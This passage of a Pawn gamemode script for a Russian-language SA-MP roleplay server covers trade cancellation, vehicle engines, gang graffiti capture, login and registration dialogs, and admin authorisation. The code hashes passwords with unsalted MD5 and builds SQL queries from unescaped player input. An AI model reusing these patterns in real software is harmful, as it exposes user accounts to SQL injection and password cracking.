			SendClientMessage(GetPVarInt(playerid,"ChomeID"),-1,"Игрок отказался от обмена");
			DeletePVar(playerid,"ChomeCena");
			DeletePVar(playerid,"ChomeID");
			return true;
		}
	 	if(GetPVarInt(playerid,"CbizCena1") > 0)
	    {
			SendClientMessage(playerid,CGREY,"Вы отказались от покупки бизнеса");
			SendClientMessage(GetPVarInt(playerid,"CbizID1"),CGREY,"Игрок отказался от покупки бизнеса");
			DeletePVar(playerid,"CbizCena1");
			DeletePVar(playerid,"CbizID1");
		}
		if(GetPVarInt(playerid,"ObmEx") > 0)
		{
	  		SendClientMessage(GetPVarInt(playerid,"ObmExP"),-1,"Игрок отказался от обмена ");
	  		SendClientMessage(playerid,-1,"Вы отказались от обмена");
	  		DeletePVar(playerid,"ObmEx");
			DeletePVar(playerid,"ObmExP");
	
		}
		if(GetPVarInt(playerid,"LicP") > 0)
		{
	  		SendClientMessage(GetPVarInt(playerid,"LicID"),-1,"Игрок отказался от покупки ");
	  		SendClientMessage(playerid,-1,"Вы отказались от покупки");
	  		DeletePVar(playerid,"LicP");
			DeletePVar(playerid,"LicID");
			DeletePVar(playerid,"LicCena");
			DeletePVar(playerid,"Lic");
		}
	    if(GetPVarInt(playerid,"ObmCena") > 0)
	    {
			  SendClientMessage(GetPVarInt(playerid,"ObmID"),-1,"Игрок отказался от обмена");
			  SendClientMessage(playerid,-1,"Вы отказались от обмена");
			  DeletePVar(playerid,"ObmID");
			  DeletePVar(playerid,"ObmCar");
			  DeletePVar(playerid,"ObmCar1");
			  DeletePVar(playerid,"ObmCena");
			  return true;
	    }
	    if(GetPVarInt(playerid,"PradCena") > 0)
	    {
			  SendClientMessage(GetPVarInt(playerid,"PradID"),-1,"Игрок отказался от покупки");
			  SendClientMessage(playerid,-1,"Вы отказались от покупки");
			  DeletePVar(playerid,"PradID");
			  DeletePVar(playerid,"PradCena");
			  return true;
	    }

	    if(GetPVarInt(playerid,"Rep") > 0)
	    {
			SendClientMessage(playerid,-1,"Вы отказались от ремонта");
			SendClientMessage(GetPVarInt(playerid,"RepID"),-1,"Игрок отказался от ремонта");
			DeletePVar(playerid,"Rep");
			DeletePVar(playerid,"RepID");
			DeletePVar(playerid,"RepCena");
	    }
		if(GetPVarInt(playerid,"Buks") > 0)
		{
			SendClientMessage(playerid,-1,"Вы отказались от буксировки");
			SendClientMessage(GetPVarInt(playerid,"BuksID"),-1,"Игрок отказался от буксировки");
			DeletePVar(playerid,"Buks");
			DeletePVar(playerid,"BuksID");
		}
	    if(GetPVarInt(playerid,"Inv") > 0)
	    {
	        SendClientMessage(GetPVarInt(playerid,"InvID"),-1,"Игрок отказался от вступления в организацию");
	        SendClientMessage(playerid,-1,"Вы отказались от вступления в организацию");
  			DeletePVar(playerid,"Inv");
   			DeletePVar(playerid,"InvID");
	    }
	    if(GetPVarInt(playerid,"GunCena") > 0)
	    {
	        SendClientMessage(GetPVarInt(playerid,"GunID"),-1,"Игрок отказался от покупки оружия");
	        SendClientMessage(playerid,-1,"Вы отказались от покупки оружия");
			DeletePVar(playerid,"GunID");
			DeletePVar(playerid,"GunM");
			DeletePVar(playerid,"GunPT");
			DeletePVar(playerid,"GunCena");
	    }
	}
	if(newkeys & KEY_SUBMISSION)
	{
		if(PlayerLogged[playerid] == false) return true;
		if(GetPlayerState(playerid) != PLAYER_STATE_DRIVER || IsInv(GetPlayerVehicleID(playerid)) || IsAPlane(GetPlayerVehicleID(playerid))) return true;
		if(Fuel[GetPlayerVehicleID(playerid)] <= 0 && !IsAPlane(playerid)) return SendClientMessage(playerid, CGREY, "В транспорте закончился бензин");
		new Float:health;
		GetVehicleHealth(GetPlayerVehicleID(playerid),health);
		if(health < 300) return SendClientMessage(playerid, CGREY, "Двигатель заглох, вызовите механика /call 911");
		new kek1 = 0;
		for(new i = 1; i <= TOTALCJ; i++)
		{
			if(GetPlayerVehicleID(playerid) != CarJob[i][jcar]) continue;
		 	kek1++;
	 		break;
		}
		if((GetPlayerVehicleID(playerid) >= rentcar[0] && GetPlayerVehicleID(playerid) <= rentcar[1] || kek1 > 0) && RentCar[GetPlayerVehicleID(playerid)] == -1) return true;
		for(new v = 1; v <= TOTALV; v++)
		{
		    if(VInfo[v][vcar] == INVALID_VEHICLE_ID) continue;
			if(GetPlayerVehicleID(playerid) == VInfo[v][vcar])
			{
			    if(VInfo[v][vkeys] == 0) return SendClientMessage(playerid,CGREY,"В данном транспортном средстве нет ключей | Вставить ключи: /keys");
			    break;
			}
		}
		SetEngine(playerid,GetPlayerVehicleID(playerid),(!Engine[GetPlayerVehicleID(playerid)]) ? (true) : (false));
	/*	if(Engine[GetPlayerVehicleID(playerid)] == false)
		{
			GetVehicleParamsEx(GetPlayerVehicleID(playerid),engine,lights,alarm,doors,bonnet,boot,objective);
			SetVehicleParamsEx(GetPlayerVehicleID(playerid),VEHICLE_PARAMS_ON,VEHICLE_PARAMS_ON,alarm,doors,bonnet,boot,objective);
			Engine[GetPlayerVehicleID(playerid)] = true;
			Lights[GetPlayerVehicleID(playerid)] = true;
		}
		else
		{
			GetVehicleParamsEx(GetPlayerVehicleID(playerid),engine,lights,alarm,doors,bonnet,boot,objective);
			SetVehicleParamsEx(GetPlayerVehicleID(playerid),VEHICLE_PARAMS_OFF,VEHICLE_PARAMS_OFF,alarm,doors,bonnet,boot,objective);
			Engine[GetPlayerVehicleID(playerid)] = false;
			Lights[GetPlayerVehicleID(playerid)] = false;
			
		}*/
		return true;
	}
	return 1;
}
stock Float:DistanceCameraTargetToLocation(Float:CamX, Float:CamY, Float:CamZ,  Float:ObjX, Float:ObjY, Float:ObjZ,  Float:FrX, Float:FrY, Float:FrZ) {

	new Float:TGTDistance;

	// get distance from camera to target
	TGTDistance = floatsqroot((CamX - ObjX) * (CamX - ObjX) + (CamY - ObjY) * (CamY - ObjY) + (CamZ - ObjZ) * (CamZ - ObjZ));

	new Float:tmpX, Float:tmpY, Float:tmpZ;

	tmpX = FrX * TGTDistance + CamX;
	tmpY = FrY * TGTDistance + CamY;
	tmpZ = FrZ * TGTDistance + CamZ;

	return floatsqroot((tmpX - ObjX) * (tmpX - ObjX) + (tmpY - ObjY) * (tmpY - ObjY) + (tmpZ - ObjZ) * (tmpZ - ObjZ));
}
stock IsPlayerAimingAt(playerid, Float:x, Float:y, Float:z, Float:radius)
{
    new Float:cx,Float:cy,Float:cz,Float:fx,Float:fy,Float:fz;
    GetPlayerCameraPos(playerid, cx, cy, cz);
    GetPlayerCameraFrontVector(playerid, fx, fy, fz);
    return (radius >= DistanceCameraTargetToLocation(cx, cy, cz, x, y, z, fx, fy, fz));
}

/*new aimstatus;
CMD:aim(playerid)
{
    aimstatus = (!aimstatus) ? (1):(0);
	return 1;
}*/
public OnPlayerUpdate(playerid)
{

 /*   if(IsPlayerNPC(playerid) && playerid == npcid)
	{
        if(IsPlayerInDynamicArea(playerid,npcsp))
        {
		    new Float:x,Float:y,Float:z;
		    GetVehicleVelocity(GetPlayerVehicleID(playerid),x,y,z);
			if(x == 0.0 || y == 0.0)
			{
				if(!npcstatus) npcstatus = 1,SendClientMessageToAll(-1,"Приехал");
				//else SetVehicleVelocity(GetPlayerVehicleID(playerid),0.0,0.0,0.0);

			}
		}
	}*/
/*	if(aimstatus)
	{
		if(IsPlayerAimingAt(playerid,1426.8015,-968.3865,37.4270,5)) SendClientMessage(playerid,-1,"YES");
		else SendClientMessage(playerid,-1,"NO");
	}*/
	new pCurWeap = GetPlayerWeapon(playerid);
    if(pCurWeap != pCurrentWeapon[playerid]) {
        for(new i = 1; i <= TOTALGZ; i++)
		{
			if(!IsPlayerInDynamicArea(playerid,GZInfo[i][gSp]) ||  !GZInfo[i][gCapture]) continue;
			if(PlayerInfo[playerid][pMember] != GZInfo[i][gFrak] && PlayerInfo[playerid][pMember] != GZInfo[i][gNapad])
			{
				ApplyAnimation(playerid,"PED","getup_front",4.0,0,0,1,0,0);
                ShowPlayerDialog(playerid,0,DIALOG_STYLE_MSGBOX,"Запрещено!","{ffffff}Предупреждение! Запрещенно достовать оружия на территории,где идет война!","Далее","");
		        SetPlayerArmedWeapon(playerid, 0);
			}
			break;
		}
		pCurrentWeapon[playerid] = pCurWeap;
    }

	SetPVarInt(playerid,"AFK_Tick", GetPVarInt(playerid,"AFK_Tick") + 1);
	if(GetPVarInt(playerid,"ColorFire"))
	{
	    if(GetPlayerWeapon(playerid) == 41)
	    {
	        if(GetPVarInt(playerid,"GZLogoID"))
	        {
	            if(IsPlayerInRangeOfPoint(playerid,2.0,GZLogoInfo[GetPVarInt(playerid,"GZLogoID")][gCoords][0],GZLogoInfo[GetPVarInt(playerid,"GZLogoID")][gCoords][1],GZLogoInfo[GetPVarInt(playerid,"GZLogoID")][gCoords][2]))
				{
				    new Float:angle;
				    GetPlayerFacingAngle(playerid, angle);
				    if(GZLogoInfo[GetPVarInt(playerid,"GZLogoID")][gCoords][4]-30 < angle < GZLogoInfo[GetPVarInt(playerid,"GZLogoID")][gCoords][4]+30)
				    {
				        printf("2 graf %d",GetPVarInt(playerid,"GZLogoID"));
						new Float:ammo = GetPVarInt(playerid,"ColorFire") - GetPlayerAmmo(playerid);
						printf("%f %f",GZLogoInfo[GetPVarInt(playerid,"GZLogoID")][gFinish],ammo);
						SetPVarInt(playerid,"ColorFire",GetPlayerAmmo(playerid));
						new i = GetPVarInt(playerid,"GZLogoID");
			    		if(GZLogoInfo[i][gOwner][1] == PlayerInfo[playerid][pMember]) return true;
                        if(GZLogoInfo[i][gFinish] < ammo) ammo = GZLogoInfo[i][gFinish];
						GZLogoInfo[i][gFinish] -= ammo;
						new string[11];
			            format(string, 11, "~g~%.1f%", GZLogoInfo[i][gFinish]);
			            GameTextForPlayer(playerid, string, 500, 3);
			            if(!GZLogoInfo[i][gFinish])
			            {
			                DestroyDynamicObject(GZLogoInfo[i][gID]+1);
			                switch(GZLogoInfo[i][gOwner][1])
			                {
			                    case 6: TotalGraf[0]--;
			                    case 7: TotalGraf[1]--;
			                    case 16: TotalGraf[2]--;
			                    case 9: TotalGraf[3]--;
			                    case 10: TotalGraf[4]--;
			                }
			                GZLogoInfo[i][gOwner][0] = GZLogoInfo[i][gOwner][1];
							GZLogoInfo[i][gOwner][1] = PlayerInfo[playerid][pMember];
							printf("3 graf %d obj: %d",GetPVarInt(playerid,"GZLogoID"),GZLogoInfo[i][gID]);
							printf("4 graf %d destroy",GZLogoInfo[i][gID]);
							PlayerInfo[playerid][pGangScore]++;
    						GZLogoInfo[i][gID] = CreateDynamicObjectEx(19353,GZLogoInfo[i-1][gCoords][0]+(0.5 * floatsin(-GZLogoInfo[i-1][gCoords][3], degrees)),GZLogoInfo[i-1][gCoords][1]+(0.5 * floatcos(-GZLogoInfo[i-1][gCoords][3], degrees)),GZLogoInfo[i-1][gCoords][2],0.000,0.000,GZLogoInfo[i-1][gCoords][3]);
							switch(GZLogoInfo[i][gOwner][1])
						    {
								case F_GROVE: SetDynamicObjectMaterial(GZLogoInfo[i][gID], 0, 1490, "tags2_lalae", "grove", 0), TotalGraf[0]++;
								case F_BALLAS: SetDynamicObjectMaterial(GZLogoInfo[i][gID], 0, 1529, "tags_latemple", "temple", 0), TotalGraf[1]++;
								case F_RIFA: SetDynamicObjectMaterial(GZLogoInfo[i][gID], 0, 1526, "tags_larifa", "rifa", 0), TotalGraf[2]++;
								case F_AZTECAS: SetDynamicObjectMaterial(GZLogoInfo[i][gID], 0, 1531, "tags_laazteca", "aztecas", 0), TotalGraf[3]++;
								case F_VAGOS: SetDynamicObjectMaterial(GZLogoInfo[i][gID], 0, 1530, "tags_lavagos", "vagos", 0), TotalGraf[4]++;
							}
							if(!PlayerInfo[playerid][pQuestS][11])
							{
								PlayerQuest[playerid][11][0]++;
								CheckQuest(playerid,11);
							}
							GZLogoInfo[i][gFinish] = 1000;
							UpdateMat(PlayerInfo[playerid][pMember]);
							SaveGZLogo(i);
							
			            }
				    }
	            }
            }
	    	else DeletePVar(playerid,"GZLogoID"), DeletePVar(playerid,"ColorFire");
	    }
	    else DeletePVar(playerid,"ColorFire");
	}
	return 1;
}

public OnPlayerStreamIn(playerid, forplayerid)
{
	return 1;
}

public OnPlayerStreamOut(playerid, forplayerid)
{
	return 1;
}

public OnVehicleStreamIn(vehicleid, forplayerid)
{
	if(vehicleid == botcar) 
	{
        SetVehiclePos(vehicleid, veh__pos[vehicleid][0], veh__pos[vehicleid][1], veh__pos[vehicleid][2]);
		SetVehicleZAngle(vehicleid, veh__pos[vehicleid][3]);
	}
	return 1;
}

public OnVehicleStreamOut(vehicleid, forplayerid)
{
	return 1;
}
function CheckPrig(playerid,text[])
{
	if(cache_get_row_count(mysql) > 0)
	{
	    strmid(PlayerInfo[playerid][pPriglas], text, 0, strlen(text), 32);
		ShowPlayerDialog(playerid, 4, DIALOG_STYLE_MSGBOX, "Выбор пола | Шаг [5/8]","{FFFFFF}Выберите пол для Вашего персонажа:", "Мужчина", "Женщина");
	}
	else
	{
	    SendClientMessage(playerid, 0xAFAFAFAA, "Данного игрока не существует!");
		ShowPlayerDialog(playerid, 5, DIALOG_STYLE_INPUT, "Кто Вас пригласил | Шаг [4/8]", "{FFFFFF}Вы не правильно указали ник игрока, который пригласил Вас на сервер.\nВы можете пропустить этот этап регистрации, на Вас это не повлияет.\n\n{AFAFAF}Ник игрока должен содержать от 4 до 24 символов", "Готово","Пропустить");
	}
	return 1;
}
function GetPos(playerid)
{
    if(cache_get_row_count(mysql)>0)
	{
	    new time = cache_get_field_content_int(0, "vhodint", mysql);
	    if(time > gettime()) ShowPlayerDialog(playerid,266,DIALOG_STYLE_MSGBOX,"Возвращение позиции","{FFFFFF}Вы перезашли на сервер менее, чем за 5 минут.\nХотите ли вы вернуться на позицию до выхода?\n","Далее","Отмена");
		else GoLoad(playerid);
	}
	return 1;
}
function GetPassword(playerid,inputtext[100])
{
    if(cache_get_row_count(mysql)>0)
	{
	    printf("GetPassword");
	    new pass[100];
        cache_get_field_content(0, "password", pass, mysql);
        if(!strcmp(MD5_Hash(inputtext),pass, true))
		{
		    query = "";
		    format(query, sizeof(query), "SELECT * FROM "TABLE_ACCOUNT" WHERE name = '%s'",PlayerInfo[playerid][pSendername]);
			mysql_tquery(mysql, query, "GetPos", "d", playerid);
			//GoLoad(playerid);
		    
		}
		else
		{
			new logtires = 3 - PlayerLogTries[playerid];
			PlayerLogTries[playerid]++;
			if(PlayerLogTries[playerid] == 4)
			{
			 	SendClientMessage(playerid,CLIGHTRED,"Введите \"/q\" для выхода с сервера");
		 		Kick(playerid, FIX_FUNCTION, 1200);
		 		return true;
		 	}
			static const fmt_str[] = "{F85A5A}Вы ввели неправельный пароль. Осталось: %i попыток ввода\n\nПри подборе пароля Вы будете заблокированы!";
		    new str1[sizeof(fmt_str)+1];
		    format(str1, sizeof(str1), fmt_str,logtires);
			ShowPlayerDialog(playerid, 7, DIALOG_STYLE_MSGBOX, "Ошибка", str1, "Назад","");

		}
    }
    else Kick(playerid, FIX_FUNCTION, 1200);
    return 1;
}
public OnDialogResponse(playerid, dialogid, response, listitem, inputtext[])
{
    printf("Игрок %s только что использовал диалог номер %i", PlayerInfo[playerid][pSendername], dialogid);
	for(new position = 0; (position = strfind(inputtext, "%", true, position)) != -1;) inputtext[position] = '#';
	if(dialog__id[playerid] != dialogid)
	{
	    if(GetPVarInt(playerid,"Cheat") == 0 && PlayerInfo[playerid][pAdmin] < 6)
	    {
		    SaveAccount(playerid),CheatKick(playerid,1);
		    return true;
	    }
	}
	else dialog__id[playerid] = -1;
	switch(dialogid)
	{
	    case 1:
	    {
			if(response)
			{
			    if(IsTextRussian(inputtext)) return ShowPlayerDialog(playerid, 3, DIALOG_STYLE_MSGBOX, "Ошибка", "{F85A5A}Используйте в пароле только символы a-Z и цифры", "Назад","");
				if(!strlen(inputtext) || strlen(inputtext) < 5 || strlen(inputtext) > 16) return ShowPlayerDialog(playerid, 3, DIALOG_STYLE_MSGBOX, "Ошибка", "{F85A5A}Используйте в пароле от 4 до 20 символов", "Назад","");
				else
				{
					strmid(PlayerInfo[playerid][pPassword], inputtext, 0, strlen(inputtext), 80);
					ShowPlayerDialog(playerid, 171, DIALOG_STYLE_INPUT, "Регистрация | Шаг [2/8]","{FFFFFF}Повторите введённый вами пароль для продолжения регистрации.", "Далее", "");
					//ShowPlayerDialog(playerid, 4, DIALOG_STYLE_MSGBOX, "Регистрация","{FFFFFF}Выберите пол для Вашего персонажа:", "Мужчина", "Женщина");
				}
			}
			else ShowPlayerDialog(playerid, 3, DIALOG_STYLE_MSGBOX, "Ошибка", "{F85A5A}Используйте в пароле от 4 до 20 символов", "Назад","");
	    
	    }
    	case 2:
		{

			if(IsTextRussian(inputtext)) return ShowPlayerDialog(playerid, 7, DIALOG_STYLE_MSGBOX, "Ошибка", "{F85A5A}Пароль не должен содержать запрещенные символы\nВозможно, Вы вводите пароль не в той раскладке", "Назад","");
			if(response)
			{
				if(!strlen(inputtext))
				{
				    static const fmt_str[] = "{FFFFFF}Ваш ник: {f7ae11}%s{FFFFFF}\n\n{FFFFFF}Вы зарегистрированы на сервере.\nВведите свой пароль, указанный при регистрации:";
				    new str1[sizeof(fmt_str)+MAX_PLAYER_NAME];
				    format(str1, sizeof(str1), fmt_str, PlayerInfo[playerid][pSendername]);
					ShowPlayerDialog(playerid, 2, DIALOG_STYLE_PASSWORD, "Авторизация", str1, "Войти","Отмена");
					return true;
				}
				query = "";
				format(query, sizeof(query), "SELECT * FROM "TABLE_ACCOUNT" WHERE name = '%s'",PlayerInfo[playerid][pSendername]);
				mysql_tquery(mysql, query, "GetPassword", "ds", playerid,inputtext);
				
				
				
			/*	else if(!strcmp(MD5_Hash(inputtext), GetAccount(PlayerInfo[playerid][pSendername], "password"), true))
				{
	    			if(strval(GetAccount(PlayerInfo[playerid][pSendername], "vhodint")) > gettime()) ShowPlayerDialog(playerid,266,DIALOG_STYLE_MSGBOX,"Возвращение позиции","{FFFFFF}Вы перезашли на сервер менее, чем за 5 минут.\nХотите ли вы вернуться на позицию до выхода?\n","Далее","Отмена");
					else GoLoad(playerid);
				    
					return true;
				}
				else
				{
					new logtires = 3 - PlayerLogTries[playerid];
					PlayerLogTries[playerid]++;
					if(PlayerLogTries[playerid] == 4)
					{
					 	SendClientMessage(playerid,CLIGHTRED,"Введите \"/q\" для выхода с сервера");
				 		Kick(playerid, FIX_FUNCTION, 1200);
				 		return true;
				 	}
 					static const fmt_str[] = "{F85A5A}Вы ввели неправельный пароль. Осталось: %i попыток ввода\n\nПри подборе пароля Вы будете заблокированы!";
				    new str1[sizeof(fmt_str)+1];
				    format(str1, sizeof(str1), fmt_str,logtires);
					ShowPlayerDialog(playerid, 7, DIALOG_STYLE_MSGBOX, "Ошибка", str1, "Назад","");

				}*/
			}
			else SendClientMessage(playerid,CLIGHTRED,"Введите \"/q\" для выхода с сервера"), Kick(playerid, FIX_FUNCTION, 1200);
		}
		case 3:
		{

			    static const fmt_str[] = "{FFFFFF}Добро пожаловать на сервер {f7ae11}Maryland RolePlay!{FFFFFF}\nДля начала игры на нашем сервере, вам необходимо пройти регистрацию.\n\nВ строчку ниже введите пароль для вашего аккаунта.\nОн будет запрашиваться каждый раз, когда вы заходите на сервер.\n\n{F85A5A}- Пароль может состоять из русских и латинских символов\n- Пароль чувствителен к регистру\n- Длина пароля может быть от 5-ти до 16-ти символов";
				new str[sizeof(fmt_str)+MAX_PLAYER_NAME];
				format(str, sizeof(str), fmt_str);
				ShowPlayerDialog(playerid, 1, DIALOG_STYLE_INPUT, "Регистрация | Шаг [1/8]", str, "Далее","");
		}
		case 4:
		{
		    switch(response)
		    {
		        case 1: PlayerInfo[playerid][pSex] = 1;
		        default: PlayerInfo[playerid][pSex] = 2;
		    }
		    ShowPlayerDialog(playerid, 6, DIALOG_STYLE_LIST, "Выбор расы | Шаг [6/8]","{FFFFFF}Европеоидная\nНегроидная\nАзиатская\nЛатиноамериканская", "Далее", "");
    		//ShowPlayerDialog(playerid, 5, DIALOG_STYLE_INPUT, "Кто Вас пригласил", "{FFFFFF}Вы не правильно указали ник игрока, который пригласил Вас на сервер.\nВы можете пропустить этот этап регистрации, на Вас это не повлияет.\n\n{AFAFAF}Ник игрока должен содержать от 4 до 24 символов", "Готово","Пропустить");
		
		}
		case 5:
		{
  			switch(response)
		    {
		        case 1:
		        {
			        new text[32];
			        if(sscanf(inputtext, "s[32]",text))
			        {
           				ShowPlayerDialog(playerid, 5, DIALOG_STYLE_INPUT, "Кто Вас пригласил | Шаг [4/8]", "{FFFFFF}Вы не правильно указали ник игрока, который пригласил Вас на сервер.\nВы можете пропустить этот этап регистрации, на Вас это не повлияет.\n\n{AFAFAF}Ник игрока должен содержать от 4 до 24 символов", "Готово","Пропустить");
			      		return true;
			        }
			        if(strlen(text) < 4 || strlen(text) > 24)
			        {
			      		ShowPlayerDialog(playerid, 5, DIALOG_STYLE_INPUT, "Кто Вас пригласил | Шаг [4/8]", "{FFFFFF}Вы не правильно указали ник игрока, который пригласил Вас на сервер.\nВы можете пропустить этот этап регистрации, на Вас это не повлияет.\n\n{AFAFAF}Ник игрока должен содержать от 4 до 24 символов", "Готово","Пропустить");
			      		return true;
			        }
			        if(IsTextRussian(inputtext))
			        {
			      		ShowPlayerDialog(playerid, 5, DIALOG_STYLE_INPUT, "Кто Вас пригласил | Шаг [4/8]", "{FFFFFF}Вы не правильно указали ник игрока, который пригласил Вас на сервер.\nВы можете пропустить этот этап регистрации, на Вас это не повлияет.\n\n{AFAFAF}Ник игрока должен содержать от 4 до 24 символов", "Готово","Пропустить");
			      		return true;
			        }
			        if(!strcmp(text, PlayerInfo[playerid][pSendername], true))
			        {
			      		ShowPlayerDialog(playerid, 5, DIALOG_STYLE_INPUT, "Кто Вас пригласил | Шаг [4/8]", "{FFFFFF}Вы не правильно указали ник игрока, который пригласил Вас на сервер.\nВы можете пропустить этот этап регистрации, на Вас это не повлияет.\n\n{AFAFAF}Ник игрока должен содержать от 4 до 24 символов", "Готово","Пропустить");
			      		return true;
			        }
			        query = "";
                    format(query, sizeof(query), "SELECT * FROM accounts WHERE name = '%s'", text);
					mysql_tquery(mysql, query, "CheckPrig", "ds", playerid,text);
					
					
			    /*    format(query, sizeof(query), "SELECT * FROM accounts WHERE name = '%s'", text);
					mysql_tquery(mysql,query);
					mysql_store_result();
					if(!mysql_fetch_row_format(query))
					{
						SendClientMessage(playerid, 0xAFAFAFAA, "Данного игрока не существует!");
					    mysql_free_result();
					    return ShowPlayerDialog(playerid, 5, DIALOG_STYLE_INPUT, "Кто Вас пригласил | Шаг [4/8]", "{FFFFFF}Вы не правильно указали ник игрока, который пригласил Вас на сервер.\nВы можете пропустить этот этап регистрации, на Вас это не повлияет.\n\n{AFAFAF}Ник игрока должен содержать от 4 до 24 символов", "Готово","Пропустить");
					}
					mysql_free_result();
			        strmid(PlayerInfo[playerid][pPriglas], text, 0, strlen(text), 32);
			        ShowPlayerDialog(playerid, 4, DIALOG_STYLE_MSGBOX, "Выбор пола | Шаг [5/8]","{FFFFFF}Выберите пол для Вашего персонажа:", "Мужчина", "Женщина");*/
   				 }
		        default:
				{

					strmid(PlayerInfo[playerid][pPriglas], "None", 0, strlen("None"), 32);
					ShowPlayerDialog(playerid, 4, DIALOG_STYLE_MSGBOX, "Выбор пола | Шаг [5/8]","{FFFFFF}Выберите пол для Вашего персонажа:", "Мужчина", "Женщина");
				}
		    }
		
		}
		case 6:
		{
		    if(!response) return Kick(playerid, FIX_FUNCTION, 1200);
		    PlayerInfo[playerid][pRas] = listitem+1;
		    ShowPlayerDialog(playerid, 100, DIALOG_STYLE_INPUT, "Выбор возраста | Шаг [7/8]","{FFFFFF}Введите возраст игрока от 18 до 70:", "Далее", "");
		}
		case 7:
		{
		    static const fmt_str[] = "{FFFFFF}Ваш ник: {f7ae11}%s{FFFFFF}\n\n{FFFFFF}Вы зарегистрированы на сервере.\nВведите свой пароль, указанный при регистрации:";
		    new str1[sizeof(fmt_str)+MAX_PLAYER_NAME];
		    format(str1, sizeof(str1), fmt_str, PlayerInfo[playerid][pSendername]);
			ShowPlayerDialog(playerid, 2, DIALOG_STYLE_PASSWORD, "Авторизация", str1, "Войти","Отмена");
		}
		case 8:
		{
			switch(response)
			{
				case 1:
				{
				    new pass;
	                if(sscanf(inputtext, "i",pass)) return ShowPlayerDialog(playerid,8,DIALOG_STYLE_INPUT,"Установите пароль","{FFFFFF}Используйте только цифры. Не менее 5 символов.","Готово","Отмена");
	                PlayerInfo[playerid][pAdminPass] = pass;
	                AdminLogged[playerid] = true;
	                SetPlayerInt(PlayerInfo[playerid][pSendername],"adminpass",pass);
					static const fmt_str[] = "Пароль установлен %i. Его нужно использовать для входа на сервер.";
	    			new str[sizeof(fmt_str)+20];
				    format(str, sizeof(str), fmt_str,pass);
					SendClientMessage(playerid,-1,str);
	                
				}
				default: ShowPlayerDialog(playerid,8,DIALOG_STYLE_INPUT,"Установите пароль","{FFFFFF}Используйте только цифры. Не менее 5 символов.","Готово","Отмена");
			}
		}
		case 9:
		{
			if(!response) return Kick(playerid, FIX_FUNCTION, 1200);
	  		new pass;
     		if(sscanf(inputtext, "i",pass)) return ShowPlayerDialog(playerid,9,DIALOG_STYLE_PASSWORD,"Авторизация","{FFFFFF}Введите ваш пароль администратора:","Готово","Отмена");
			if(PlayerInfo[playerid][pAdminPass] != pass) return Kick(playerid, FIX_FUNCTION, 1200);
			AdminLogged[playerid] = true;
            new ipStr[16];
			GetPlayerIp( playerid, ipStr, 16 );
		/*	new kek,kek1,kek2,kek3;
			GetPod(ipStr,kek,kek1);
			GetPod(PlayerInfo[playerid][pIp],kek2,kek3);
			if(kek != kek2 && kek1 != kek3)
			{
				SetPVarInt(playerid,"CheckProvAdm",1);
			    ShowPlayerDialog(playerid,301,DIALOG_STYLE_INPUT,"Авторизация","{FFFFFF}Введите код высланый Вам на почту:","Готово","Отмена");
			    new rand = random(9999);
			    SetPVarInt(playerid,"Kod",rand);
			    static const fmt_st2r[] = "Авторизация администратора Maryland Role Play. Ваш код: %d";
	 			new str4[sizeof(fmt_st2r)+2];
	    		format(str4, sizeof(str4), fmt_st2r,rand);
			  //  SendMail(PlayerInfo[playerid][pMail], "lasvegasroleplay@l-rp.ru", "Maryland Role Play", "Maryland Role Play", str4);
			    return true;
			}*/
			SetPlayerStr(PlayerInfo[playerid][pSendername],"ip",ipStr);
			for(new i;i <10; i++) TextDrawShowForPlayer(playerid, CheatText[i]);
			if(FD1 || FD2) SendClientMessage(playerid,CYELLOW,"Вы авторизовались как администратор");
			else
			{
				static const fmt_str[] = "[A] %s авторизовался как администратор";
	 			new str6[sizeof(fmt_str)+32];
	    		format(str6, sizeof(str6), fmt_str,PlayerInfo[playerid][pSendername]);
			    SendAdminMessage(CYELLOW,str6);
		    }
		}
		case 10:
		{
		    if(!response) return true;
		    switch(listitem+1)
		    {
				case 1: Stats(playerid,playerid);
				case 2: ShowPlayerDialog(playerid,13,DIALOG_STYLE_LIST,"Команды сервера","{FFFFFF}1 | Личный транспорт\n2 | Дом\n3 | Бизнес\n4 | Организация\n5 | Управление организацией\n6 | Работа\n7 | Прочее\n8 | Семья","Далее","Назад");
				case 3:
				{
                    ShowPlayerDialog(playerid,496,DIALOG_STYLE_LIST,"Квесты","{ffffff}1 | Основная линия\n2 | Нелегальные организации\n3 | Государственные организации","Далее","Отмена");
				}
				case 4: ShowPlayerDialog(playerid,14,DIALOG_STYLE_INPUT,"Связь с администрацией","{FFFFFF}Введите ID игрока и причину подачи на него в репорт:","Далее","Назад");
				case 5: ShowPlayerDialog(playerid,15,DIALOG_STYLE_INPUT,"Задать вопрос","{FFFFFF}Введите чётко поставленный вопрос:","Далее","Назад");
				case 6: ShowS(playerid);
				case 7: ShowPUl(playerid);
				case 8:
				{
					new text1[20],text[20],text2[20],text3[20];
				    switch(PlayerInfo[playerid][pPin])
				    {
				        case 0: text1 = "Установить";
						default: text1 = "Изменить";
				    }
				    switch(PlayerInfo[playerid][pPin1])
				    {
				        case 0: text = "Включить";
						default: text = "Выключить";
				    }
				    switch(PlayerInfo[playerid][pGA])
				    {
				        case 0: text2 = "Установить";
						default: text2 = "Выключить";
				    }
			     	switch(PlayerInfo[playerid][pVKStatus])
				    {
				        case 0: text3 = "Установить";
						default: text3 = "Выключить";
				    }
					static const fmt_str[] = "{FFFFFF}1 | %s пин-код\n2 | %s пин-код\n3 | %s двухэтапную аутентификацию\n4 | %s VK Security";
					new str[sizeof(fmt_str)+20+20+20-2*3];
					format(str, sizeof(str), fmt_str,text,text1,text2,text3);
					ShowPlayerDialog(playerid,137,DIALOG_STYLE_LIST,"Безопасность",str,"Далее","Назад");
				}
				case 9:
				{
					cmd_donate(playerid);
				}
				case 10:
				{
				    if(PlayerInfo[playerid][pCode]) return SendClientMessage(playerid,CGREY,"Вы уже вводите промокод!");
					ShowPlayerDialog(playerid,412,DIALOG_STYLE_INPUT,"Промокод","{ffffff}Введите промокод:\n","Далее","Отмена");
				}
				
			}
		}
		case 11:
		{
			switch(response)
			{
				case 1: return true;
				default: cmd_menu(playerid,"");
			}
		}

		case 13:
		{
			switch(response)
			{
				case 1: 
				{
				    switch(listitem)
				    {
						case 0: ShowPlayerDialog(playerid,23,DIALOG_STYLE_MSGBOX,"Личный транспорт","{FFFFFF}/carpass – Тех.Паспорт автомобиля\n\n/changecar – обменяться автомобилями с игроком\n\n/sellcar – Продать транспорт игроку\n\n/keys - вставить/вытащить ключи из транспорта\n\n/sing - включить/отключить сигнализацию\n\n/fuel – Заправиться\n\n/cars – Весь Ваш транспорт\n\n/givecarkey - Выдать ключи\n\n/takecarkey - Забрать ключи","Назад","");
